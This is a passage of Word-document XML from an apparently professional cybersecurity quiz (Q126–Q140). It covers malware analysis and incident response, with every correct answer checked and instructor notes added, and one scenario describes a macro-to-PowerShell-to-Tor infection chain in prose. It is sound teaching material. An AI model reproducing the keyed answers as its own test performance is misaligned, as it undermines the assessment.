      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q126</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>When submitting a file to VirusTotal, you should be aware that:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) VirusTotal automatically removes malware from your system</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) VirusTotal guarantees detection of all malware types</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Files submitted to VirusTotal are shared with security vendors and could expose sensitive data if they contain private information</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) VirusTotal can only analyse Windows executables, not documents or scripts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CRITICAL] · *Time:* 60 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Privacy warning: DON'T submit proprietary documents, customer data, or credential files to VirusTotal. Use hashes (SHA-256) to check without uploading.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q127</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The MITRE ATT&amp;CK framework organises adversary behaviours into:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Attack severity scores from 1 to 10</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Malware families grouped by country of origin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Tactics (what the attacker is trying to do) and techniques (how they do it)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Vulnerability types mapped to CVE numbers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* 14 tactics: Reconnaissance → Resource Development → Initial Access → Execution → Persistence → Privilege Escalation → Defence Evasion → Credential Access → Discovery → Lateral Movement → Collection → C2 → Exfiltration → Impact.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q128</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which MITRE ATT&amp;CK tactic describes malware maintaining long-term access after initial compromise?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Initial Access</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Execution</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Persistence</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Collection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Persistence techniques: scheduled tasks (cron jobs/Windows Task Scheduler), startup registry keys, services, rootkits.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q129</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Why should malware analysis always be performed in an isolated virtual machine?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Virtual machines are faster than physical machines for analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Physical machines cannot run malware analysis tools like ANY.RUN</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>To prevent the malware from spreading to production systems, the analyst's host machine, or the internet</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Legal regulations require malware analysis to occur in virtual environments only</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Isolation = air-gapped or host-only network. Take snapshots before execution; restore after. Some malware detects VMs and behaves differently.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q130</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A cryptojacker on an office computer would most likely manifest as:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Files being encrypted and a ransom note appearing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Frequent popups and redirected web browsing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Consistently high CPU usage, slow system performance, increased electricity consumption</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Credentials being stolen and sold on dark web forums</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Cryptojacking = mining cryptocurrency silently. Detection: CPU spikes when browsing (browser-based miner) or Task Manager shows unknown process at 90%+ CPU.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q131</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What does C2 (Command and Control) mean in malware context?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) A two-factor authentication system used by malware analysts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) The second version of a piece of malware after initial release</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The attacker's server that sends instructions to compromised machines and receives stolen data</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) A cybersecurity framework for controlling incident response</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Malware phones home to C2. Blocking C2 communication = isolating the malware. IOCs include unusual outbound traffic to unknown IPs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q132</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The `strings` command on a Linux system is used in malware analysis to:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) List all running processes containing suspicious names</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Scan for network connections made by a running process</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Extract human-readable text strings from a binary file (URLs, IP addresses, registry keys)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Compare two malware samples for code similarity</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">*Instructor Note:* Quick static triage: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="0F772A"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>strings malware.exe | grep -E "http|\.exe|cmd"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — often reveals C2 URLs, dropped filenames, registry keys.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q133</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A banking trojan specifically targets:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) The operating system kernel to achieve privilege escalation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">B) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Financial credentials, online banking sessions, and payment information</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Corporate email accounts for BEC attacks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Industrial control systems in power plants</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Emotet → Trickbot → Ryuk = common banking trojan → ransomware chain seen in many Nigerian bank attacks.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q134</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Indicators of Compromise (IOCs) include:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) CVSS scores and vulnerability patch timelines</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) SPF and DKIM configuration records for email</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>File hashes, malicious IP addresses, domain names, and registry keys associated with known malware</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Penetration test findings and remediation recommendations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* IOCs are shareable threat intelligence. SIEM ingests IOC feeds to auto-detect matches. MISP = open-source IOC sharing platform.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q135</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ★ DOUBLE POINTS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>An analyst opens ANY.RUN and runs a suspicious Word document. The sandbox shows: Word.exe → spawns cmd.exe → executes PowerShell → PowerShell downloads a DLL from 185.220.x.x → DLL creates a new Windows service → outbound connection to a Tor exit node. Map this to MITRE ATT&amp;CK tactics in order.</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Initial Access → Execution → Defence Evasion → Persistence → Exfiltration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Reconnaissance → Weaponisation → Delivery → Exploitation → Installation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Initial Access (phishing doc) → Execution (macro/PowerShell) → Defence Evasion (DLL injection) → Persistence (new service) → C2 (Tor connection)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Credential Access → Lateral Movement → Collection → Exfiltration → Impact</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [SCENARIO] · *Time:* 60 s · *Points:* 2,000 ★</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Classic macro malware kill chain. Each step maps to a specific MITRE tactic. Debrief: This exact sequence appeared in the Emotet campaigns that hit Nigerian financial institutions. The Tor exit node = C2 using Tor for anonymity.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>MODULE 10 [PROFESSIONAL]: Incident Response &amp; Digital Forensics</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Level: Professional | Questions: Q136–Q150*</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q136</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What is the FIRST phase of the NIST Incident Response lifecycle?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Detection &amp; Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Containment</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Preparation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Post-Incident Activity</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 20 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* NIST SP 800-61 Rev 2: Preparation → Detection &amp; Analysis → Containment/Eradication/Recovery → Post-Incident. Preparation = the most important phase.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q137</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>During an incident, which action should be taken FIRST when a compromised server is discovered?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Immediately shut down and reformat the server</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Call the police and wait for instructions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Isolate (contain) the server from the network to prevent further spread</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Run a vulnerability scan to determine how the attacker got in</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Contain first, then investigate. Shutting down destroys volatile evidence (RAM). Reformatting before imaging destroys all forensic value.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q138</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"Order of volatility" in digital forensics means:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) The order in which antivirus software should scan different storage media</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) The ranking of evidence by how likely it is to be tampered with</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The sequence for collecting evidence, starting with most volatile (lost when power off) to least volatile</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) The legal requirement for how long different types of logs must be retained</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Most → Least volatile: RAM → Network state → Running processes → Disk → Optical media → Backups. Capture RAM FIRST.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q139</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Windows Event ID 4625 indicates:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) A new user account was created</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) A system service was installed</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A failed logon attempt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) A successful privilege escalation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Key Windows Event IDs: 4624=Successful logon, 4625=Failed logon, 4698=Scheduled task created, 7045=New service installed. Brute force = hundreds of 4625 events.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q140</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"Chain of custody" in digital forensics refers to:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) A blockchain record of all files accessed on a system</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) The network chain connecting compromised systems during a breach</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Documentation of everyone who has handled evidence and every action taken from collection to court</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) A sequence of firewall rules triggered during an incident</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Without chain of custody, evidence is inadmissible in court. Who collected it, when, where, who transported it — all documented.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
